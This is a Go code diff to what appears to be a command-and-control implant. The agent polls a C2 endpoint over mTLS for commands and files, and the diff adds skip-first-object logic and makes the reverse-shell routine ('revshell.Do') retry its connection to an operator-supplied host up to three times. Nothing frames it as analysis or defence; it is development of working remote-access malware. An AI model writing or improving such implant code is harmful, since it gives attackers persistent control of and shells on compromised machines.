@@ -68,12 +68,17 @@ func main() {
 
 func awaitFile(c2Endpoint, UUID, kX1, kX2, aesKey string, ticker *time.Ticker, mTLSClient *http.Client) {
 	var prevCmd int
+	var first = true
 	for range ticker.C {
 		fObject, cmdID, err := getObjectBytes(prevCmd, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient, "2")
 		if err != nil {
 			continue
 		}
 		prevCmd = cmdID
+		if first {
+			first = false
+			continue
+		}
 		fileObj := &models.KarObjectFile{}
 		if err := json.Unmarshal(fObject, fileObj); err != nil {
 			continue
@@ -104,10 +109,15 @@ func awaitFile(c2Endpoint, UUID, kX1, kX2, aesKey string, ticker *time.Ticker, m
 
 func awaitCmd(c2Endpoint, UUID, kX1, kX2, aesKey string, ticker *time.Ticker, mTLSClient *http.Client) {
 	var prevCmd int
+	var first = true
 	for range ticker.C {
 		cmdObjectBytes, cmdID, err := getObjectBytes(prevCmd, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient, "1")
 		if err == nil {
 			cmdObj := &models.KarObjectCmd{}
+			if first {
+				first = false
+				continue
+			}
 			if err := json.Unmarshal(cmdObjectBytes, cmdObj); err != nil {
 				continue
 			}
@@ -197,7 +207,13 @@ func parseCmdObject(cmdObject *models.KarObjectCmd, cmdID int, c2Endpoint, UUID 
 		if err != nil {
 			return
 		}
-		err = revshell.Do(net.JoinHostPort(args[0].StrValue, args[1].StrValue), conf)
+		// try revshell 3 times
+		for i := 0; i < 3; i++ {
+			err = revshell.Do(net.JoinHostPort(args[0].StrValue, args[1].StrValue), conf)
+			if err == nil {
+				break
+			}
+		}
 		if err != nil {
 			responseObject.Code = 1
 			responseObject.Data.Error = err.Error()
